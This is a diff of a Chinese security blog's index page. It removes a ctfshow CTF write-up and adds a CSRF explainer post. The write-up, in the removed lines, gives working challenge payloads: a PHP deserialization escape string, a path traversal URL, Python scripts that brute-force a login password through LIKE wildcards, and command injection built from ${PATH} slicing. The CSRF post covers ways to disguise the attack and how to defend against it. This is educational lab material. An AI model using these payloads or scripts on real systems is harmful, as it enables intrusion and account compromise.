@@ -152,136 +152,6 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-ctfshow月饼杯" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/08/ctfshow%E6%9C%88%E9%A5%BC%E6%9D%AF/">ctfshow月饼杯</a>
-    </h1>
-  
-
-        
-        <a href="/2021/10/08/ctfshow%E6%9C%88%E9%A5%BC%E6%9D%AF/" class="archive-article-date">
-  	<time datetime="2021-10-08T13:29:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="web1-此夜圆"><a href="#web1-此夜圆" class="headerlink" title="web1_此夜圆"></a>web1_此夜圆</h1><p><em><strong>一江春水何年尽，万古清光此夜圆</strong></em></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211008213201404.png" alt="image-20211008213201404"></p>
-<p>打开题目发现有php源码可以下载（最先点快了根本没发现，点进去一脸懵逼还扫了半天目录）下载下来，发现源码。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211008213321392.png" alt="image-20211008213321392"></p>
-<p>这里哥们一看就知道是似曾相识题型。<a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13338789.html">php反序列化</a>。</p>
-<p>简单的思路就是把我们输入的参数通过字符逃逸的方式，让密码等于yu22x，就可以得到flag</p>
-<p>我们需要的是在最后构造一个**”;s:8:”password”;s:5:”yu22x”;}<strong>，(</strong>“;<strong>这两个符号是为了闭合前面的Firebasky字符串。后面的</strong>}<strong>是为了结束反序列化，让本来应该加入反序列化的</strong>“;s:8:”password”;s:1:”1”}**被舍弃掉)</p>
-<p>这里一共有30个字符，而发现这里的过滤函数将Firebasky替换成Firebaskyup，一下子增加两个字符，算一下就需要填写15个Firebasky，所以我们可以构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=?1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>然后通过get方式提交就可以得到flag了</p>
-<h1 id="web2-故人心"><a href="#web2-故人心" class="headerlink" title="web2_故人心"></a>web2_故人心</h1><p><em><strong>三五夜中新月色，两千里外故人心</strong></em></p>
-<p>打开环境，迎面而来就是php代码，而且这个代码4个if在递进，就更加让人心烦了。</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211008220728448.png" alt="image-20211008220728448"></p>
-<p>我们一个一个看</p>
-<p>第一关需要过变量a的数字验证关。要求为：is_numeric($a) and strlen($a)&lt;7 and $a!=0 and $a**2==0</p>
-<p>这里需要知道php的一个知识点，php在一个特别小的数的时候，进行平方运算时，会被截断，由于这里限制了strlen，所以我们的办法是采用科学计数法，即1e-162.就可以完成第一个条件。</p>
-<p>第二个我也一直看不懂，后头看了网上的wp，才知道原来是有提示的，但是不知道为什么现在好像没看到了。原题提示如图：</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211009104323259.png" alt="image-20211009104323259"></p>
-<p>可以知道，他给出了一些关于后几位的数字。我们知道md5的碰撞原理是md5经过加密后，哈希值前面的字符串为0e，然后php语言会默认当作科学计数法，于是第一个数字就是0，就完成了md5的碰撞。为了满足$b==hash(“md2”, $b)和$c==hash(“md2”,hash(“md2”, $c))这两个条件，我们需要满足的是<strong>原变量b和c与hash出来的字符串前面都会有0e</strong>。这样的话，相当于就满足了<strong>0=0</strong>条件。</p>
-<p>于是我们需要写一个php脚本来爆出原来的数字。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for ($i=0;$i&lt;999;$i++)&#123;</span><br><span class="line">	$b=&#x27;0e&#x27;.$i.&#x27;024452&#x27;;</span><br><span class="line">	if($b==hash(&#x27;md2&#x27;,$b))&#123;</span><br><span class="line">		echo $b;</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;	</span><br><span class="line">echo&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">for ($j=1000;$j&lt;=9999;$j++)&#123;</span><br><span class="line">	$c=&#x27;0e&#x27;.$j.&#x27;48399&#x27;;</span><br><span class="line">	if($c==hash(&#x27;md2&#x27;,hash(&#x27;md2&#x27;,$c)))&#123;</span><br><span class="line">		echo $c;</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>然后爆出b=0e652024452 c=0e603448399</p>
-<p>接下来是最后一个，需要以post的方式提交url。这里科普一下以下几个函数：</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/20191018141048779.png" alt="img"></p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211009112720788.png" alt="image-20211009112720788"></p>
-<p>观察源码可以发现，他主要是做了以下几步：</p>
-<p> if(filter_var($url[1],FILTER_VALIDATE_URL)) 用来判断数据符不符合url格式。</p>
-<p> $host=parse_url($url[1]); 用parse_url函数解析该url，形成一个数组。</p>
-<p>if(preg_match(‘/ctfshow.com$/‘,$host[‘host’]))，如果host名中有ctfshow.com就可以了</p>
-<p>这里我们还需要知道一个知识点，php源码中，在向目标请求时先会判断使用的协议，如果协议无法识别，就会认为它是一个目录，所以这里我们可以运用目录穿越漏洞。</p>
-<p>构造payload=</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=abc://ctfshow.com/../../../../../fl0g.txt</span><br></pre></td></tr></table></figure>
-
-<p>这里要返回多少个前目录，我也是一个一个试出来的……</p>
-<h1 id="web3-莫负婵娟"><a href="#web3-莫负婵娟" class="headerlink" title="web3_莫负婵娟"></a>web3_莫负婵娟</h1><p><em><strong>皎洁一年惟此夜，莫教容易负婵娟</strong></em></p>
-<p>这道题打开网页源码一看就可以知道</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211009142528411.png" alt="image-20211009142528411"></p>
-<p>是想要考like查询。</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cl1024cl/p/6205484.html">like模糊查询</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">like模糊匹配</span><br><span class="line">% 表示零个或多个字符的任意字符串</span><br><span class="line">_（下划线）表示任何单个字符</span><br><span class="line">[ ] 表示指定范围 ([a-f]) 或集合 ([abcdef]) 中的任何单个字符</span><br><span class="line">[^] 不属于指定范围 ([a-f]) 或集合 ([abcdef]) 的任何单个字符</span><br><span class="line">* 它同于DOS命令中的通配符，代表多个字符</span><br><span class="line">？同于DOS命令中的？通配符，代表单个字符</span><br><span class="line"># 大致同上，不同的是代只能代表单个数字</span><br></pre></td></tr></table></figure>
-
-<p>要想猜到密码，首先需要知道密码位数。然后去网上看其他师傅的脚本抄了一个猜位数的脚本。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&#x27;http://0162cf6c-3e6d-4639-bb8e-cfadfcd47c23.challenge.ctf.show:8080/login.php&#x27;</span><br><span class="line">def get(a):</span><br><span class="line">    s=&#x27;&#x27;</span><br><span class="line">    while(a&gt;0):</span><br><span class="line">        s+=&#x27;_&#x27;</span><br><span class="line">        a-=1</span><br><span class="line">    return s</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    data=&#123;</span><br><span class="line">        &#x27;username&#x27;:&#x27;yu22x&#x27;,</span><br><span class="line">        &#x27;password&#x27;:f&#x27;&#123;get(i)&#125;&#x27;</span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.post(url=url,data=data)</span><br><span class="line">    if &#x27;wrong username or password&#x27; in r.text:</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        print(i)</span><br><span class="line">        break</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>可以知道密码为32位。</p>
-<p>然后又需要写脚本来爆破，这里也看了网上师傅的脚本。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">a=&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">url = &#x27;http://0162cf6c-3e6d-4639-bb8e-cfadfcd47c23.challenge.ctf.show:8080/login.php&#x27;</span><br><span class="line"></span><br><span class="line">pwd = &#x27;&#x27;</span><br><span class="line">for i in range(32):</span><br><span class="line">    print(&#x27;i = &#x27;+str(i+1),end=&#x27;\t&#x27;)</span><br><span class="line">    for j in a:</span><br><span class="line">        password = pwd + j + (31 - i) * &#x27;_&#x27;</span><br><span class="line">        data = &#123;&#x27;username&#x27;:&#x27;yu22x&#x27;,&#x27;password&#x27;:password&#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        if &#x27;wrong&#x27; not in r.text:</span><br><span class="line">             pwd += j</span><br><span class="line">             print(pwd)</span><br><span class="line">             break</span><br></pre></td></tr></table></figure>
-
-<p>得到密码为：</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211009144954720.png" alt="image-20211009144954720"></p>
-<p>成功通过用户名和密码登录后台，发现一个神奇的查询网址</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211009150744353.png" alt="image-20211009150744353"></p>
-<p>通过bp抓包进行爆破，会发现小写字母全部被过滤了，然后用fuzz测试，可以发现，大写字母，数字，{},空格，$,~可以使用。根据题目的提示：<strong>环境变量 +linux字符串截取 + 通配符</strong>再加上网上师傅的答案，我们可以通过linux系统的$PATH环境变量来构造特殊的字符串命令。</p>
-<p>这里进行一下解释：</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211009151246244.png" alt="image-20211009151246244"></p>
-<p>在linux中输出$PATH时，他会给出一个字符串目录，我们可以通过字符串截取的操作来取得想要的字符。比如:</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211009151400787.png" alt="image-20211009151400787"></p>
-<p>该命令意思是从$PATH变量里的第五个字符开始，拿1位字符，对照上图来看，第五个字符就是l，所以可以得到l。因此我们可以使用**ip=1;${PATH:5:1}${PATH:2:1}**来查询系统的文件。</p>
-<p>ps：在这里要提醒大家，应该是环境原因，如果你post提交数据的时候，前面不加**ip=**，我的环境就会崩掉。发现加了ip=就正常使用</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211009151713694.png" alt="image-20211009151713694"></p>
-<p>可以看到有flag.php文件。</p>
-<p>然后我们通过构造nl命令，可以查看该文件。</p>
-<p>这里又需要用到liunx中的通配符知识，liunux中，问号表示一个字符，我们发现flag.php有总共7个字，于是我们可以构造</p>
-<p><strong>ip=0;${PATH:14:1}${PATH:5:1} ????.???</strong></p>
-<p>这个来查看该文件，之后打开源代码即可发现flag</p>
-<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20211009152659082.png" alt="image-20211009152659082"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/10/08/ctfshow%E6%9C%88%E9%A5%BC%E6%9D%AF/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-session-and-cookie" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -335,6 +205,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -437,6 +318,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -527,6 +419,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -610,6 +513,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -751,6 +665,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -824,6 +749,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -1060,6 +996,17 @@ if($res) &#123;
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -1219,6 +1166,17 @@ if($res) &#123;
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -1298,6 +1256,17 @@ if($res) &#123;
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -1332,9 +1301,103 @@ if($res) &#123;
 
 
   
+    <article id="post-CSRF跨站点请求伪造" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/11/CSRF%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/">CSRF跨站点请求伪造</a>
+    </h1>
+  
+
+        
+        <a href="/2021/07/11/CSRF%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" class="archive-article-date">
+  	<time datetime="2021-07-11T02:07:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="什么是CSRF"><a href="#什么是CSRF" class="headerlink" title="什么是CSRF"></a>什么是CSRF</h1><p>CSRF跨站请求伪造，也被称为“One Click Attack”，通常缩写为CSRF，是一种对网站的恶意利用。它与XSS不同，XSS利用站点内的新人用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。</p>
+<p>它的成因是因为网站的Cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，就会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的CSRF脚本或者包含CSRF脚本的链接，可能会执行一些用户不想做的功能。</p>
+<p>攻击特点：攻击者盗用用户的身份，以用户的名义进行某些非法操作。</p>
+<p>tips:业内对需要交互的漏洞不重视。</p>
+<h2 id="CSRF的核心在于缺乏验证："><a href="#CSRF的核心在于缺乏验证：" class="headerlink" title="CSRF的核心在于缺乏验证："></a>CSRF的核心在于缺乏验证：</h2><ol>
+<li>像验证码是CSRF最好的防御方法，修改密码，我们要输入一个验证码，做任何操作都加个验证码其实完全杜绝CSRF。</li>
+<li>开发为了安全，设置了一个东西叫做Token。它是一种验证机制，每个请求的表单里面都存在了一个Token字段。（Token是现在解决CSRF最好的方法）</li>
+</ol>
+<p>测试是否有CSRF的方法最简单的是注册两个账号:用一个来抓包准备攻击包，另外一个账号来尝试看攻击包是否有作用。</p>
+<h1 id="攻击前提："><a href="#攻击前提：" class="headerlink" title="攻击前提："></a>攻击前提：</h1><p>1、受害者已经登陆合法网站，建立了一个会话。</p>
+<p>2、合法网站要有csrf漏洞。</p>
+<p>3、受害者访问了黑客发来的链接，进行了非法操作的实现。（第三步最为困难）</p>
+<p>Tip:burp里有CSRF的自动生成脚本。</p>
+<p>CSRF攻击是很难实现的。</p>
+<h1 id="CSRF攻击的改进："><a href="#CSRF攻击的改进：" class="headerlink" title="CSRF攻击的改进："></a>CSRF攻击的改进：</h1><p>1、利用短链接工具将url缩短，增强迷惑性。</p>
+<p>2、将csrf代码嵌入其他网页(iframe)</p>
+<p>3、将csrf代码写入xss注入点中（最好是存储型）</p>
+<p>用户触发xss 便可以实现csrf攻击。</p>
+<p>优点：更加具有隐蔽性，不会出现密码修改界面。</p>
+<h1 id="CSRF和XSS的区别"><a href="#CSRF和XSS的区别" class="headerlink" title="CSRF和XSS的区别"></a>CSRF和XSS的区别</h1><p>　　xss：跨站脚本攻击、诱骗用户点击恶意链接盗取用户cookie进行攻击、不需要用户进行登录、xss除了利用cookie还可以篡改网页等。</p>
+<p>　    csrf：跨站请求伪造、无法获取用户的cookie而是直接冒充用户、需要用户登录后进行操作</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/07/11/CSRF%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
     </nav>
   
 
@@ -1444,6 +1507,14 @@ MathJax.Hub.Queue(function() {
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">web安全的杂杂恋</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ctf</a>
+              </li>
             
             <div class="clearfix"></div>
           </ul>
